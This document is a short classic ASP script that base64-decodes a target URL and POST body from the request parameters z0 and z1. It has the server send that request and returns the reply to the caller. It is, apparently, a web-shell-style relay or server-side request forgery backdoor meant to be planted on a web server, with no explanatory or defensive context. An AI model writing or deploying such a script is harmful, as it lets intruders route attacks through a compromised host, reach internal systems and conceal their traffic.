<%

Response.ContentType = "text/html"

Function HttpPost(url, data, ByRef httpCode)

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    On Error Resume Next

    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.setRequestHeader "Content-Length", Len(data)
    http.Send data

    If Err.Number <> 0 Then
        httpCode = 0
        HttpPost = ""
        Err.Clear
    Else
        httpCode = http.Status
        HttpPost = http.responseText
    End If

    On Error GoTo 0

    Set http = Nothing

End Function

Function Base64Decode(str)

    Dim xml, node, stm

    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("base64")

    node.dataType = "bin.base64"
    node.text = str

    Set stm = Server.CreateObject("ADODB.Stream")

    stm.Type = 1
    stm.Open
    stm.Write node.nodeTypedValue
    stm.Position = 0

    stm.Type = 2
    stm.Charset = "utf-8"

    Base64Decode = stm.ReadText

    stm.Close

    Set stm = Nothing
    Set node = Nothing
    Set xml = Nothing

End Function

Dim httpCode
Dim body
Dim url
Dim data

url = Base64Decode(Request("z0"))
data = Base64Decode(Request("z1"))

If url <> "" Then
    body = HttpPost(url, data, httpCode)
    Response.Write body
End If

%>